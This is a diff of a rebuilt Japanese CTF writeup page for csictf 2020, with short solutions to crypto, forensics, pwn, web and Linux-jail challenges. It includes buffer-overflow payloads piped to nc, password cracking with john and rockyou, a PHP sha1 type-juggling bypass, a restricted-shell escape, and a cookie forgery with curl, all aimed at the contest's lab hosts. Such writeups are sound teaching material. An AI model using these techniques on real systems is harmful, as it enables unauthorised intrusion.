@@ -23,7 +23,7 @@
 <meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
 
 
-<meta name="generator" content="Hugo 0.74.2 with theme even" />
+<meta name="generator" content="Hugo 0.119.0 with theme even" />
 
 
 <link rel="canonical" href="https://captureamerica.github.io/writeups/post/csictf_2020/" />
@@ -35,24 +35,20 @@
 
 
 
-<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link href="https://captureamerica.github.io/writeups/sass/main.min.f92fd13721ddf72129410fd8250e73152cc6f2438082b6c0208dc24ee7c13fc4.css" rel="stylesheet">
 
 
 
 <meta property="og:title" content="csictf 2020 Writeup" />
 <meta property="og:description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://captureamerica.github.io/writeups/post/csictf_2020/" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/csictf_2020/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2020-07-22T13:00:00+09:00" />
 <meta property="article:modified_time" content="2020-07-22T13:00:00+09:00" />
 <meta itemprop="name" content="csictf 2020 Writeup">
-<meta itemprop="description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も">
-<meta itemprop="datePublished" content="2020-07-22T13:00:00&#43;09:00" />
-<meta itemprop="dateModified" content="2020-07-22T13:00:00&#43;09:00" />
-<meta itemprop="wordCount" content="1975">
-
-
-
+<meta itemprop="description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も"><meta itemprop="datePublished" content="2020-07-22T13:00:00+09:00" />
+<meta itemprop="dateModified" content="2020-07-22T13:00:00+09:00" />
+<meta itemprop="wordCount" content="1977">
 <meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="csictf 2020 Writeup"/>
 <meta name="twitter:description" content="URL: https://ctf.csivit.com/challenges 最終順位は、319位でした。 日曜日にだけやったので、その後に追加された分は見れてません。 以下、Discordにあった情報ですが、58個も"/>
@@ -223,7 +219,6 @@
     <li><a href="#web-oreo">[Web]: Oreo</a>
       <ul>
         <li><a href="#challenge-12">Challenge</a></li>
-        <li><a href="#unsolved">(Unsolved)</a></li>
       </ul>
     </li>
   </ul>
@@ -237,12 +232,12 @@
 </a>
 </div>
 <p>URL: <a href="https://ctf.csivit.com/challenges">https://ctf.csivit.com/challenges</a></p>
-<p><br />
-最終順位は、319位でした。</p>
+<br />
+最終順位は、319位でした。
 <img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score0.png" alt="csictf_2020_Score0.png">
-<p><br /></p>
+<br />
 <img src="https://captureamerica.github.io/writeups/img/csictf_2020_Score1.png" alt="csictf_2020_Score1.png">
-<p><br /></p>
+<br />
 <p>日曜日にだけやったので、その後に追加された分は見れてません。</p>
 <p>以下、Discordにあった情報ですが、58個もチャレンジがあったみたいです。現時点で、すでにチャレンジ一覧は見れません。。</p>
 <img src="https://captureamerica.github.io/writeups/img/csictf_2020_Discord.png" alt="csictf_2020_Discord.png">
@@ -257,10 +252,10 @@
 <ul>
 <li>enc.txt</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution">Solution</h3>
 <p>RsaCtfTool.pyで解けるRSAの問題でした。NをFactorizeしてから実行しました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{sh0uld'v3_t4k3n_b1gg3r_pr1m3s}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -275,10 +270,10 @@
 <ul>
 <li>sky.jpg</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-1">Solution</h3>
 <p>stringsコマンドで解ける問題でした。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{j0ker_w4snt_happy}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -293,13 +288,13 @@
 <ul>
 <li>arched.png</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-2">Solution</h3>
 <p>$ foremost</p>
 <p>$ steghide extract -sf 00000000.jpg</p>
 <p>$ zip2john flag.zip &gt; hash.txt</p>
 <p>$ john hash.txt &ndash;wordlist=/usr/share/wordlists/rockyou.txt</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{1_h0pe_y0u_don't_s33_m3_here}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -313,7 +308,7 @@
 <ul>
 <li>panda.zip</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-3">Solution</h3>
 <p>$ zip2johnとjohnを使ってzipを解凍すると（パスワード: 2611）、２つのjpgファイルが出てきます。</p>
 <p>サイズが全く同じであるため、バイナリの比較を取ってみたところ、フラグが見つかりました。</p>
@@ -348,7 +343,7 @@ $ cmp -bl panda.jpg panda1.jpg
 $ cmp -bl panda.jpg panda1.jpg | rev | cut -c 1 | tr -d "\n" ; echo
 csictf{kung_fu_p4nd4}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{kung_fu_p4nd4}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -364,7 +359,7 @@ nc chall.csivit.com 30001</p>
 <ul>
 <li>pwn-intended-0x1</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-4">Solution</h3>
 <pre>
 $ (python -c 'print("A"*48)' ; cat - ) | nc chall.csivit.com 30001
@@ -375,7 +370,7 @@ Thanks!
 Oh no, you spilled some coffee on the floor! Use the flag to clean it.
 csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{y0u_ov3rfl0w3d_th@t_c0ff33_l1ke_@_buff3r}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -391,7 +386,7 @@ nc chall.csivit.com 30007</p>
 <ul>
 <li>pwn-intended-0x2</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-5">Solution</h3>
 <pre>
 $ (python -c 'print("A"*44)+"\xbe\xba\xfe\xca\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30007
@@ -400,7 +395,7 @@ Safe Journey!
 You've reached your destination, here's a flag!
 csictf{c4n_y0u_re4lly_telep0rt?}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{c4n_y0u_re4lly_telep0rt?}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -416,7 +411,7 @@ nc chall.csivit.com 30013</p>
 <ul>
 <li>pwn-intended-0x3</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-6">Solution</h3>
 <pre>
 $ (python -c 'print("A"*40)+"\xce\x11\x40\x00\x00\x00\x00\x00"' ; cat - ) | nc chall.csivit.com 30013
@@ -424,7 +419,7 @@ Welcome to csictf! Time to teleport again.
 Well, that was quick. Here's your flag:
 csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -436,10 +431,10 @@ csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
 <br /><br />
 <a href="http://chall.csivit.com:30203">http://chall.csivit.com:30203</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-7">Solution</h3>
 <p>style.cssの中にフラグが入っていました。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{w3lc0me_t0_csictf}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -451,12 +446,12 @@ csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
 <br /><br />
 <a href="http://chall.csivit.com:30272">http://chall.csivit.com:30272</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-8">Solution</h3>
 <p>上記にアクセスすると、以下のコードが表示されます。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -478,37 +473,37 @@ csictf{ch4lleng1ng_th3_v3ry_l4ws_0f_phys1cs}
 </span><span class="lnt">20
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
-
-<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]))</span> <span class="p">{</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;10932435112&#34;</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not so easy mate.&#39;</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]);</span>
-    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="mi">10932435112</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$target</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
-        <span class="k">print</span> <span class="nv">$flag</span><span class="p">;</span>
-    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-        <span class="k">print</span> <span class="s2">&#34;csictf{loser}&#34;</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
-    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;10932435112&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not so easy mate.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$hash</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hash&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$target</span> <span class="o">=</span> <span class="nx">sha1</span><span class="p">(</span><span class="mi">10932435112</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$target</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="s1">&#39;flag.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">print</span> <span class="s2">&#34;csictf{loser}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-Hashコリジョン系のチャレンジのようです。10932435112とか、0e07766915004133176347055865026311692244（10932435112のsha1）でひらすらググると、以下の情報が見つかりました。</p>
+</div><br />
+Hashコリジョン系のチャレンジのようです。10932435112とか、0e07766915004133176347055865026311692244（10932435112のsha1）でひらすらググると、以下の情報が見つかりました。
 <pre>
 var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
 </pre>
-<p><br /></p>
+<br />
 <p>以下のURLでアクセスするとフラグがもらえました。</p>
 <p><a href="http://chall.csivit.com:30272/?hash=aaroZmOk">http://chall.csivit.com:30272/?hash=aaroZmOk</a></p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{typ3_juggl1ng_1n_php}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -520,10 +515,10 @@ var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
 <br /><br />
 <a href="http://chall.csivit.com:30231">http://chall.csivit.com:30231</a></p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <p>robots.txtを参照して、<a href="http://chall.csivit.com:30231/fade/to/black">http://chall.csivit.com:30231/fade/to/black</a> にアクセスするだけです。</p>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{br0b0t_1s_pr3tty_c00l_1_th1nk}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -535,7 +530,7 @@ var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));
 <br /><br />
 nc chall.csivit.com 30611</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <p>どうやら禁止されているコマンドを実行するとcowsayが走る、みたいなやつです。以下にあるように、xxdなんかは、cowsayが走りませんでした。</p>
 <pre>
@@ -567,14 +562,14 @@ find .
                 ||     ||
 
 </pre>
-<p><br />
-tacコマンドで取れました。</p>
+<br />
+tacコマンドで取れました。
 <pre>
 user @ csictf: $ 
 tac flag.txt
 csictf{1_4m_cl4rk3_k3nt}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{1_4m_cl4rk3_k3nt}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -586,12 +581,12 @@ csictf{1_4m_cl4rk3_k3nt}
 <br /><br />
 ssh <a href="mailto:user1@chall.csivit.com">user1@chall.csivit.com</a> -p 30630 (Password is find32)</p>
 </blockquote>
-<p><br /></p>
+<br />
 <h3 id="solution-11">Solution</h3>
 <p>ls -alでファイルの一覧を見ると、ひとつだけサイズの異なるものが見つかります。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -606,22 +601,22 @@ ssh <a href="mailto:user1@chall.csivit.com">user1@chall.csivit.com</a> -p 30630 
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-java" data-lang="java"><span class="n">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
-<span class="n">total</span> <span class="n">4816</span>
-<span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">12288</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">09</span> <span class="o">.</span>
-<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="n">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="n">4096</span> <span class="n">Jul</span> <span class="n">19</span> <span class="n">03</span><span class="o">:</span><span class="n">50</span> <span class="o">..</span>
-<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">02KG7GI3</span>
-<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">02M95EZJ</span>
-<span class="o">:</span>
-<span class="o">(</span><span class="n">snip</span><span class="o">)</span>
-<span class="o">:</span>
-<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MIN0CJNB</span>
-<span class="hl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10058</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MITS1KT3</span>
-</span><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="n">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="n">10000</span> <span class="n">Jul</span> <span class="n">17</span> <span class="n">23</span><span class="o">:</span><span class="n">08</span> <span class="n">MLNCZNJH</span>
-<span class="o">:</span></code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">$</span> <span class="n">ls</span> <span class="o">-</span><span class="n">al</span>
+</span></span><span class="line"><span class="cl"><span class="n">total</span> <span class="mi">4816</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">12288</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">09</span> <span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span>   <span class="mi">4096</span> <span class="n">Jul</span> <span class="mi">19</span> <span class="mi">03</span><span class="o">:</span><span class="mi">50</span> <span class="o">..</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">10000</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">08</span> <span class="mi">02</span><span class="n">KG7GI3</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">10000</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">08</span> <span class="mi">02</span><span class="n">M95EZJ</span>
+</span></span><span class="line"><span class="cl"><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="n">snip</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">:</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">10000</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">08</span> <span class="n">MIN0CJNB</span>
+</span></span><span class="line hl"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">10058</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">08</span> <span class="n">MITS1KT3</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">user1</span> <span class="mi">10000</span> <span class="n">Jul</span> <span class="mi">17</span> <span class="mi">23</span><span class="o">:</span><span class="mi">08</span> <span class="n">MLNCZNJH</span>
+</span></span><span class="line"><span class="cl"><span class="o">:</span></span></span></code></pre></td></tr></table>
 </div>
 </div>
-<p><br /></p>
+<br />
 <p>MITS1KT3の中身を確認すると、<code>csictf{not_the_flag}{user2:AAE976A5232713355D58584CFE5A5}</code> というのが見つかります。</p>
 <p>user2にsuして、ホームにあるファイルをチェックします。</p>
 <pre>
@@ -650,7 +645,7 @@ drwxr-xr-x 1 root root    4096 Jul 19 03:50 ..
 -rwxr-x--- 1 root user2 756798 Jul 17 23:08 sadsas.tx
 
 </pre>
-<p><br /></p>
+<br />
 <p>ここで、sadsas.tx だけ少しサイズが大きいので、このファイルにフラグが入っていると予想。</p>
 <pre>
 user2@find32-55bc4b84d5-9gcbl:~$ diff adgsfdgasf.d sadsas.tx 
@@ -658,7 +653,7 @@ user2@find32-55bc4b84d5-9gcbl:~$ diff adgsfdgasf.d sadsas.tx
 > th15_15_unu5u41
 
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{th15_15_unu5u41}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -668,37 +663,37 @@ user2@find32-55bc4b84d5-9gcbl:~$ diff adgsfdgasf.d sadsas.tx
 <blockquote>
 <p>My nephew is a fussy eater and is only willing to eat chocolate oreo. Any other flavour and he throws a tantrum.
 <br /><br />
-<a href="http://chall.csivit.com">http://chall.csivit.com</a>:30243</p>
+<a href="http://chall.csivit.com:30243">http://chall.csivit.com:30243</a></p>
 </blockquote>
-<p><br /></p>
-<h3 id="unsolved">(Unsolved)</h3>
-<p>かなりの数の人が解けていたにも関わらず、自分が解けなかった問題。。。</p>
+<br />
+### (Unsolved)
+かなりの数の人が解けていたにも関わらず、自分が解けなかった問題。。。
 <p>やることと言えば、flavour=Y2hvY29sYXRlCg%3D%3D (&ldquo;strawberry&rdquo;) でセットされたCookieの値を Y2hvY29sYXRl (&ldquo;chocolate&rdquo;) に変えてアクセスするだけなんですけど、解けなかった原因は以下です。</p>
 <pre>
 $ echo chocolate | base64
 Y2hvY29sYXRlCg==
 </pre>
-<p><br />
-echoだと改行が入っちゃうので、printfとかでやるのが正解でした。</p>
+<br />
+echoだと改行が入っちゃうので、printfとかでやるのが正解でした。
 <pre>
 $ printf chocolate | base64
 Y2hvY29sYXRl
 </pre>
-<p><br />
-というか、echo -nでもできました。</p>
+<br />
+というか、echo -nでもできました。
 <pre>
 $ echo -n chocolate | base64
 Y2hvY29sYXRl
 </pre>
-<p><br />
-考えてみたら、そうだよなぁ。（1年間CTFやってきて、今頃こんなのにハマるとは。。）</p>
-<p><br />
-まだサーバ生きていたので、やってみました。</p>
+<br />
+考えてみたら、そうだよなぁ。（1年間CTFやってきて、今頃こんなのにハマるとは。。）
+<br />
+まだサーバ生きていたので、やってみました。
 <pre>
 $ curl http://chall.csivit.com:30243/ --cookie "flavour=Y2hvY29sYXRl" ; echo
 csictf{1ick_twi5t_dunk}
 </pre>
-<p><br /></p>
+<br />
 <p>Flag: <code>csictf{1ick_twi5t_dunk}</code></p>
 <p><br /><br />
 <br /><br /></p>
@@ -754,7 +749,7 @@ csictf{1ick_twi5t_dunk}
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -789,20 +784,21 @@ csictf{1ick_twi5t_dunk}
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
